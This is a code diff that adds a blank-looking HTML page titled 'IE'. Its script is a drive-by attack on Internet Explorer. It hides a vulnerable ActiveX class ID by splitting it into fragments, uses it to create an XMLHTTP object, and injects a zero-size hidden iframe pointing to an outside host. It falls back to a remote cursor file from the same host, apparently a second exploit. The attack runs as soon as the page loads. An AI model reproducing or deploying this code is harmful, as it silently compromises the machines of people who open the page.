@@ -1,0 +1,22 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=US-ASCII" />
+<title>IE</title>
+</head>
+<body>
+<SCRIPT LANGUAGE="javascript">
+window.status="";
+try{
+var downf = document.createElement("object");
+downf.setAttribute("classid", "clsid:BD9"+"6C556-6"+"5A3-11D"+"0-983A-00C"+"04FC2"+"9E36");
+str="Microsoft.XMLHTTP";
+var O = downf.CreateObject(str,"");
+document.write("<iframe width=0 height=0 src=http://www.8568985.com/garegky/egk.htm></iframe>");
+}
+catch(e)
+{
+document.write("<DIV style=\"CURSOR: url('http://www.8568985.com/garegky/egk.cur')\"></DIV>");
+};
+</SCRIPT>
+</body>
+</html>
